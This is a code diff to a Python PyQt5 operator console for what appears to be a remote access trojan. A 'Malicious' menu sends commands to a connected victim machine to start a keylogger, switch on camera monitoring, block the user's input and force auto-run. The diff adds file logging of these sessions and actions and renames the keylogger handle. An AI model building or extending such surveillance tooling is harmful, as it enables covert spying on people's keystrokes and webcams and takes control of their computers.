@@ -1,6 +1,5 @@
 from os.path import realpath, dirname
 from sys import argv, exit as sysExit, path as sysPath
-sysPath.append(sysPath[0] + "\\externals")    #add the externals folder to the path in order to import external dependencies
 
 from PyQt5.QtWidgets import QMainWindow, QApplication, QShortcut, QMessageBox, QFileDialog, QPushButton, QMenu
 from PyQt5.QtCore import Qt, pyqtSlot, QState, pyqtSignal
@@ -21,6 +20,7 @@ from cv2 import cvtColor
 from numpy import zeros, uint8, ones, ndarray
 from collections import deque
 
+import logging
 import numpy    #remove after
 
 
@@ -48,7 +48,7 @@ class Window(QMainWindow, Ui_MainWindow):
         self.setFocus()
         self.menuMalicious.menuAction().setVisible(False)
 
-        self.logger = None
+        self.keyLogger = None
         #self.addAction(self.action_Save_To)
         #self.(self.action_UI)
         #self.addAction(self.action_Exit)
@@ -57,7 +57,7 @@ class Window(QMainWindow, Ui_MainWindow):
         #self.addAction(self.action_Disconnect)
         #self.addAction(self.action_Bind)
         #self.addAction(self.action_Close)
-        #self.menuMalicious.menuAction().setVisible(False)
+        self.menuMalicious.menuAction().setVisible(False)
 
         self.cmdQueue = deque(maxlen=1024)
 
@@ -67,6 +67,20 @@ class Window(QMainWindow, Ui_MainWindow):
         self.app = App
         self.app.aboutToQuit.connect(self.closeEvent)
         self.app.focusChanged.connect(self.focusChangedEvent)
+
+        self.logger = logging.getLogger(__name__)
+        self.logger.setLevel(logging.INFO)
+
+        handler = logging.FileHandler("log.log")
+        fmt0 = logging.Formatter("%(message)s")
+        handler.setFormatter(fmt0)
+
+        self.logger.addHandler(handler)
+        self.logger.info("\n\n" + "-"*86 + "\n")
+
+        fmt = logging.Formatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S")
+        handler.setFormatter(fmt)
+        self.logger.info("PROGRAM INITIATED")
 
         #load the saved settings from config file and apply them
         self.settingsDict = self.ReadFromJson()
@@ -134,6 +148,7 @@ class Window(QMainWindow, Ui_MainWindow):
         self.connection = ip
         self.server = Server(self.connection)
         self.server.start()
+        self.logger.info(f"connected to session at {self.connection}")
 
 
     def closeEvent(self, event):
@@ -149,6 +164,7 @@ class Window(QMainWindow, Ui_MainWindow):
         if reply == QMessageBox.Yes:
             self.on_action_Disconnect_triggered()
             self.on_action_Close_triggered()
+            self.logger.info("PROGRAM CLOSED")
             event.accept()
 
         else:
@@ -200,8 +216,10 @@ class Window(QMainWindow, Ui_MainWindow):
         if not self.connection:
             return
 
+        tempConn = self.connection
         self.connection = ""
         self.server.close()
+        self.logger.info(f"disconnected from session at {tempConn}\n")
 
 
     @pyqtSlot()
@@ -215,6 +233,7 @@ class Window(QMainWindow, Ui_MainWindow):
         self.menuMalicious.menuAction().setVisible(True)
         self.menuRecord.menuAction().setEnabled(True)
         self.action_Save_To.setEnabled(True)
+        self.logger.info(f"session created at {self.client.addr}")
 
 
     @pyqtSlot()
@@ -228,56 +247,70 @@ class Window(QMainWindow, Ui_MainWindow):
         self.menuMalicious.menuAction().setVisible(False)
         self.menuRecord.menuAction().setEnabled(False)
         self.action_Save_To.setEnabled(False)
-        self.rec = False
+        if self.rec:
+            self.rec = False
+            self.logger.info("stopped recording")
         self.label.updateBuffer([[cvtColor(zeros((900, 1200), uint8), 8), (0, 0, 1200, 900)]])
+        self.logger.info(f"session closed at {self.client.addr}\n")
 
 
     @pyqtSlot()
     def on_action_Start_Recording_triggered(self):
         self.rec = True
+        self.logger.info("started recording")
 
 
     @pyqtSlot()
     def on_action_Stop_Recording_triggered(self):
+        if self.rec:
+            self.logger.info("stopped recording")
+
         self.rec = False
 
 
     @pyqtSlot()
     def on_action_Start_Cam_triggered(self):
         self.cmdQueue.append(["Start Cam"])
+        self.logger.info("started cam monitoring")
 
 
     @pyqtSlot()
     def on_action_Stop_Cam_triggered(self):
         self.cmdQueue.append(["Stop Cam"])
+        self.logger.info("stopped cam monitoring")
 
 
     @pyqtSlot()
     def on_action_Force_Run_triggered(self):
         self.cmdQueue.append(["Force Run"])
+        self.logger.info("put program in auto run")
 
 
     @pyqtSlot()
     def on_action_Block_Input_triggered(self):
         self.cmdQueue.append(["Block Input"])
+        self.logger.info("blocking input on server the machine")
 
 
     @pyqtSlot()
     def on_action_Unblock_Input_triggered(self):
         self.cmdQueue.append(["Unblock Input"])
+        self.logger.info("stopped blocking input on the server machine")
 
 
     @pyqtSlot()
     def on_action_Start_KeyLogger_triggered(self):
         self.cmdQueue.append(["Start KeyLogger"])
-        self.logger = open(dirname(__file__) + r"\logger.txt", 'w')
+        self.keyLogger = open(dirname(__file__) + r"\logger.txt", 'w')
+        self.logger.info("starting keylogger on the server machine")
 
 
     @pyqtSlot()
     def on_action_Stop_KeyLogger_triggered(self):
         self.cmdQueue.append(["Stop KeyLogger"])
-        self.logger.close()
-        self.logger = None
+        self.keyLogger.close()
+        self.keyLogger = None
+        self.logger.info("stopping keylogger on the server machine")
 
 
 def main():
